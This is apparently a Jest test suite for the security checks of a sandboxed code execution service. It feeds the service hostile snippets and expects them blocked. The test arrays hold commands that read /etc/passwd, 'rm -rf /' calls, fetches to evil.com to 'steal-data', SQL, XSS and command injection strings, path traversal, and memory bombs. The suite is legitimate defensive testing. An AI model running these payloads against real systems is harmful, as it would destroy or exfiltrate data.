// Security Validation Tests for Code Execution System
import { describe, it, expect, beforeEach, jest } from '@jest/globals';
import { CodeExecutionService } from '../../functions/src/services/codeExecutionService';
import { createMockFirestore, maliciousCodePatterns } from '../helpers/backend-mocks';

// Mock Firebase Admin
jest.mock('firebase-admin', () => ({
  firestore: () => createMockFirestore(),
  FieldValue: {
    serverTimestamp: jest.fn(),
    increment: jest.fn(),
    arrayUnion: jest.fn(),
    arrayRemove: jest.fn()
  }
}));

// Mock logger
jest.mock('../../functions/src/utils/logger', () => ({
  logger: {
    info: jest.fn(),
    error: jest.fn(),
    warn: jest.fn(),
    debug: jest.fn()
  }
}));

describe('Security Validation Tests', () => {
  let service: CodeExecutionService;

  beforeEach(() => {
    service = new CodeExecutionService();
    jest.clearAllMocks();
  });

  describe('Code Injection Prevention', () => {
    const basicTestCase = {
      id: 'security-test',
      name: 'Security Test',
      input: 5,
      expectedOutput: 10,
      isVisible: true,
      weight: 100
    };

    it('should detect and block file system access attempts', async () => {
      const fileSystemCodes = [
        // Node.js file system access
        'const fs = require("fs"); fs.readFileSync("/etc/passwd");',
        'import fs from "fs"; fs.writeFileSync("malicious.txt", "hack");',
        'require("fs").unlinkSync("/important/file");',
        
        // Python file operations
        'import os; os.system("cat /etc/passwd")',
        'with open("/etc/passwd") as f: content = f.read()',
        'import subprocess; subprocess.call(["rm", "-rf", "/"])',
        
        // Java file operations
        'import java.io.File; new File("/etc/passwd").delete();',
        'Runtime.getRuntime().exec("rm -rf /");',
        
        // Go file operations
        'import "os"; os.Remove("/etc/passwd")',
        'import "os/exec"; exec.Command("rm", "-rf", "/").Run()'
      ];

      for (const code of fileSystemCodes) {
        const result = await service.executeCode({
          code,
          language: 'javascript',
          testCases: [basicTestCase]
        });

        expect(result.success).toBe(false);
        expect(result.error).toContain('unsafe operations');
      }
    });

    it('should detect and block network access attempts', async () => {
      const networkCodes = [
        // HTTP requests
        'fetch("http://evil.com/steal-data");',
        'const http = require("http"); http.get("http://evil.com");',
        'import requests; requests.get("http://evil.com")',
        'import urllib.request; urllib.request.urlopen("http://evil.com")',
        
        // WebSocket connections
        'new WebSocket("ws://evil.com");',
        'const WebSocket = require("ws"); new WebSocket("ws://evil.com");',
        
        // Database connections
        'const mysql = require("mysql"); mysql.createConnection({});',
        'import psycopg2; psycopg2.connect("host=evil.com")'
      ];

      for (const code of networkCodes) {
        const result = await service.executeCode({
          code,
          language: 'javascript',
          testCases: [basicTestCase]
        });

        // Should either block or handle gracefully
        if (!result.success) {
          expect(result.error).toMatch(/unsafe|restricted|forbidden/i);
        }
      }
    });

    it('should detect and block process execution attempts', async () => {
      const processExecutionCodes = [
        // Node.js process execution
        'require("child_process").exec("whoami");',
        'require("child_process").spawn("ls", ["-la"]);',
        'process.exit(1);',
        
        // Python process execution
        'import subprocess; subprocess.run(["whoami"]);',
        'import os; os.system("whoami");',
        'import sys; sys.exit(1);',
        
        // Java process execution
        'Runtime.getRuntime().exec("whoami");',
        'ProcessBuilder pb = new ProcessBuilder("whoami");',
        'System.exit(1);',
        
        // Go process execution
        'import "os/exec"; exec.Command("whoami").Run();',
        'import "os"; os.Exit(1);'
      ];

      for (const code of processExecutionCodes) {
        const result = await service.executeCode({
          code,
          language: 'javascript',
          testCases: [basicTestCase]
        });

        expect(result.success).toBe(false);
        expect(result.error).toContain('unsafe operations');
      }
    });

    it('should detect and block eval/dynamic code execution', async () => {
      const dynamicExecutionCodes = [
        // JavaScript eval
        'eval("malicious code");',
        'Function("return process")();',
        'new Function("return global")();',
        'setTimeout("malicious()", 1000);',
        'setInterval("hack()", 1000);',
        
        // Python eval
        'eval("__import__(\\"os\\").system(\\"ls\\")")',
        'exec("import os; os.system(\\"whoami\\")")',
        'compile("malicious", "<string>", "exec")',
        
        // Dynamic imports
        '__import__("os").system("whoami")',
        'importlib.import_module("os").system("whoami")'
      ];

      for (const code of dynamicExecutionCodes) {
        const result = await service.executeCode({
          code,
          language: 'javascript',
          testCases: [basicTestCase]
        });

        expect(result.success).toBe(false);
        expect(result.error).toContain('unsafe operations');
      }
    });
  });

  describe('Resource Exhaustion Prevention', () => {
    const resourceTestCase = {
      id: 'resource-test',
      name: 'Resource Test',
      input: 1,
      expectedOutput: 1,
      isVisible: true,
      weight: 100
    };

    it('should detect infinite loops', async () => {
      const infiniteLoopCodes = [
        'while(true) { console.log("spam"); }',
        'for(;;) { /* infinite */ }',
        'function recursive() { recursive(); } recursive();',
        'while True: pass',
        'while True: print("spam")',
        'def recursive(): recursive()\nrecursive()',
        'while(true) { System.out.println("spam"); }',
        'for { fmt.Println("spam") }'
      ];

      for (const code of infiniteLoopCodes) {
        const result = await service.executeCode({
          code,
          language: 'javascript',
          testCases: [resourceTestCase],
          timeLimit: 1000 // 1 second timeout
        });

        // Should either timeout or detect the pattern
        expect(result.testResults.some(tr => 
          tr.error?.includes('Time limit exceeded') || 
          tr.executionTime > 1000
        )).toBe(true);
      }
    });

    it('should detect memory bombs', async () => {
      const memoryBombCodes = [
        // JavaScript memory bombs
        'const arr = []; while(true) arr.push(new Array(1000000));',
        'let str = "x"; while(true) str += str;',
        'const obj = {}; while(true) obj[Math.random()] = new Array(10000);',
        
        // Python memory bombs
        'arr = []\nwhile True: arr.extend([0] * 1000000)',
        's = "x"\nwhile True: s += s',
        
        // Java memory bombs
        'List<byte[]> list = new ArrayList<>(); while(true) list.add(new byte[1000000]);',
        'String s = "x"; while(true) s += s;'
      ];

      for (const code of memoryBombCodes) {
        const result = await service.executeCode({
          code,
          language: 'javascript',
          testCases: [resourceTestCase],
          memoryLimit: 64 // 64MB limit
        });

        // Should handle gracefully without crashing
        expect(result).toBeDefined();
        if (!result.success) {
          expect(result.error).toMatch(/memory|resource|limit/i);
        }
      }
    });

    it('should enforce execution time limits', async () => {
      const slowCodes = [
        // Computationally expensive operations
        'let sum = 0; for(let i = 0; i < 10000000; i++) sum += Math.sqrt(i);',
        'function fibonacci(n) { return n <= 1 ? n : fibonacci(n-1) + fibonacci(n-2); } fibonacci(40);',
        'sum([i**2 for i in range(1000000)])',
        'def fib(n): return n if n <= 1 else fib(n-1) + fib(n-2)\nfib(35)'
      ];

      for (const code of slowCodes) {
        const startTime = Date.now();
        
        const result = await service.executeCode({
          code,
          language: 'javascript',
          testCases: [resourceTestCase],
          timeLimit: 2000 // 2 second timeout
        });

        const executionTime = Date.now() - startTime;
        
        // Should not take too long
        expect(executionTime).toBeLessThan(10000); // 10 seconds max
        
        // Should either complete or timeout gracefully
        expect(result).toBeDefined();
      }
    });
  });

  describe('Input Validation and Sanitization', () => {
    it('should handle malicious input in test cases', async () => {
      const maliciousInputs = [
        // XSS attempts
        '<script>alert("xss")</script>',
        'javascript:alert("xss")',
        'onload="alert(1)"',
        
        // SQL injection attempts
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "1; DELETE FROM users WHERE 1=1; --",
        
        // Command injection
        '; rm -rf /',
        '| whoami',
        '&& cat /etc/passwd',
        
        // Path traversal
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        
        // Format string attacks
        '%s%s%s%s',
        '%n%n%n%n',
        
        // Buffer overflow attempts
        'A'.repeat(10000),
        '\x00\x01\x02\x03\x04'
      ];

      for (const maliciousInput of maliciousInputs) {
        const testCase = {
          id: 'malicious-input-test',
          name: 'Malicious Input Test',
          input: maliciousInput,
          expectedOutput: maliciousInput, // Echo back
          isVisible: true,
          weight: 100
        };

        const result = await service.executeCode({
          code: 'function solve(input) { return input; }',
          language: 'javascript',
          testCases: [testCase]
        });

        // Should handle gracefully without executing malicious payload
        expect(result).toBeDefined();
        expect(result.testResults[0].actualOutput).toBe(maliciousInput);
      }
    });

    it('should validate and sanitize code content', async () => {
      const borderlineCodes = [
        // Legitimate but suspicious patterns
        'const password = "secret123";',
        'const apiKey = "abc123def456";',
        'const token = localStorage.getItem("auth");',
        'console.log(process.env.NODE_ENV);',
        
        // Comments that might contain malicious content
        '// TODO: rm -rf / when done',
        '/* <script>alert("xss")</script> */',
        '# import os; os.system("evil")',
        
        // String literals with suspicious content
        'return "http://evil.com/steal?data=" + userInfo;',
        'const url = "ftp://malicious.com/upload";'
      ];

      for (const code of borderlineCodes) {
        const result = await service.executeCode({
          code,
          language: 'javascript',
          testCases: [{
            id: 'borderline-test',
            name: 'Borderline Test',
            input: 1,
            expectedOutput: 1,
            isVisible: true,
            weight: 100
          }]
        });

        // Should handle without false positives
        expect(result).toBeDefined();
      }
    });
  });

  describe('Privilege Escalation Prevention', () => {
    it('should prevent access to restricted modules', async () => {
      const restrictedModules = [
        // Node.js restricted modules
        'require("crypto").randomBytes(100);',
        'require("cluster").fork();',
        'require("worker_threads").Worker;',
        'require("vm").runInNewContext("code");',
        
        // Python restricted modules
        'import ctypes; ctypes.CDLL("libc.so.6")',
        'import _ctypes',
        'import marshal; marshal.loads(data)',
        'import pickle; pickle.loads(data)',
        
        // Dangerous Python built-ins
        '__import__("builtins").eval("code")',
        'globals()["__builtins__"]["eval"]("code")',
        'vars()["__builtins__"]["exec"]("code")'
      ];

      for (const code of restrictedModules) {
        const result = await service.executeCode({
          code,
          language: 'javascript',
          testCases: [{
            id: 'privilege-test',
            name: 'Privilege Test',
            input: 1,
            expectedOutput: 1,
            isVisible: true,
            weight: 100
          }]
        });

        expect(result.success).toBe(false);
        expect(result.error).toContain('unsafe operations');
      }
    });

    it('should prevent prototype pollution attacks', async () => {
      const prototypePollutionCodes = [
        // JavaScript prototype pollution
        'Object.prototype.isAdmin = true;',
        'Array.prototype.includes = function() { return true; };',
        'Function.prototype.call = function() { /* malicious */ };',
        '__proto__.isAdmin = true;',
        'constructor.prototype.isAdmin = true;',
        
        // JSON pollution
        'JSON.parse(\'{"__proto__": {"isAdmin": true}}\');',
        'Object.assign({}, JSON.parse(\'{"__proto__": {"isAdmin": true}}\'));'
      ];

      for (const code of prototypePollutionCodes) {
        const result = await service.executeCode({
          code,
          language: 'javascript',
          testCases: [{
            id: 'pollution-test',
            name: 'Pollution Test',
            input: {},
            expectedOutput: {},
            isVisible: true,
            weight: 100
          }]
        });

        // Should detect or handle safely
        expect(result).toBeDefined();
      }
    });
  });

  describe('Error Message Security', () => {
    it('should not leak sensitive information in error messages', async () => {
      const errorProducingCodes = [
        'throw new Error("/home/user/secret.txt not found");',
        'throw new Error("Connection failed to database at secret-db.internal:5432");',
        'throw new Error("API key abc123def456 is invalid");',
        'console.error("Debug: user password is " + password);'
      ];

      for (const code of errorProducingCodes) {
        const result = await service.executeCode({
          code,
          language: 'javascript',
          testCases: [{
            id: 'error-test',
            name: 'Error Test',
            input: 1,
            expectedOutput: 1,
            isVisible: true,
            weight: 100
          }]
        });

        // Check that error messages don't contain sensitive patterns
        if (result.error) {
          expect(result.error).not.toMatch(/password|secret|key|token|internal/i);
        }
        
        result.testResults.forEach(tr => {
          if (tr.error) {
            expect(tr.error).not.toMatch(/password|secret|key|token|internal/i);
          }
        });
      }
    });

    it('should sanitize console output', async () => {
      const codes = [
        'console.log("User password:", "secret123");',
        'console.error("Database connection string: postgres://user:pass@host/db");',
        'console.warn("API endpoint: https://api.internal.com/secret");',
        'print("Secret key: abc123def456")',
        'System.out.println("Password: secret123");'
      ];

      for (const code of codes) {
        const result = await service.executeCode({
          code,
          language: 'javascript',
          testCases: [{
            id: 'console-test',
            name: 'Console Test',
            input: 1,
            expectedOutput: 1,
            isVisible: true,
            weight: 100
          }]
        });

        // Console output should be sanitized or filtered
        if (result.consoleOutput) {
          expect(result.consoleOutput).not.toMatch(/password.*secret123/i);
          expect(result.consoleOutput).not.toMatch(/postgres:\/\/.*:.*@/);
        }
      }
    });
  });

  describe('Race Condition and Concurrency Security', () => {
    it('should handle concurrent malicious requests safely', async () => {
      const maliciousRequests = Array.from({ length: 10 }, (_, i) => 
        service.executeCode({
          code: `
            // Attempt to overload system
            const data = new Array(1000000).fill(${i});
            data.forEach(x => console.log(x));
          `,
          language: 'javascript',
          testCases: [{
            id: `concurrent-test-${i}`,
            name: `Concurrent Test ${i}`,
            input: i,
            expectedOutput: i,
            isVisible: true,
            weight: 100
          }]
        })
      );

      const results = await Promise.all(maliciousRequests);

      // All requests should complete without crashing the system
      results.forEach((result, i) => {
        expect(result).toBeDefined();
        expect(typeof result.success).toBe('boolean');
      });
    });

    it('should prevent timing attacks on execution', async () => {
      const timingAttackCodes = [
        'const start = Date.now(); while(Date.now() - start < 5000) {}',
        'const start = performance.now(); while(performance.now() - start < 5000) {}',
        'setTimeout(() => {}, 10000);',
        'setInterval(() => {}, 1000);'
      ];

      for (const code of timingAttackCodes) {
        const startTime = Date.now();
        
        const result = await service.executeCode({
          code,
          language: 'javascript',
          testCases: [{
            id: 'timing-test',
            name: 'Timing Test',
            input: 1,
            expectedOutput: 1,
            isVisible: true,
            weight: 100
          }],
          timeLimit: 2000
        });

        const executionTime = Date.now() - startTime;
        
        // Should not allow extended execution time
        expect(executionTime).toBeLessThan(10000); // 10 seconds max
        expect(result).toBeDefined();
      }
    });
  });

  describe('Compliance and Audit Trail', () => {
    it('should log security violations for audit', async () => {
      const logger = require('../../functions/src/utils/logger').logger;
      
      const maliciousCode = 'require("fs").readFileSync("/etc/passwd");';
      
      await service.executeCode({
        code: maliciousCode,
        language: 'javascript',
        testCases: [{
          id: 'audit-test',
          name: 'Audit Test',
          input: 1,
          expectedOutput: 1,
          isVisible: true,
          weight: 100
        }]
      });

      // Should log the security violation
      expect(logger.error).toHaveBeenCalledWith(
        expect.stringContaining('Code execution failed'),
        expect.any(Object)
      );
    });

    it('should maintain execution context isolation', async () => {
      // First execution that sets a global variable
      const firstCode = 'global.maliciousData = "compromised";';
      
      await service.executeCode({
        code: firstCode,
        language: 'javascript',
        testCases: [{
          id: 'isolation-test-1',
          name: 'Isolation Test 1',
          input: 1,
          expectedOutput: 1,
          isVisible: true,
          weight: 100
        }]
      });

      // Second execution that tries to access the global variable
      const secondCode = 'return global.maliciousData || "clean";';
      
      const result = await service.executeCode({
        code: secondCode,
        language: 'javascript',
        testCases: [{
          id: 'isolation-test-2',
          name: 'Isolation Test 2',
          input: 1,
          expectedOutput: 'clean',
          isVisible: true,
          weight: 100
        }]
      });

      // Should not have access to data from previous execution
      expect(result.testResults[0].actualOutput).toBe('clean');
    });
  });
});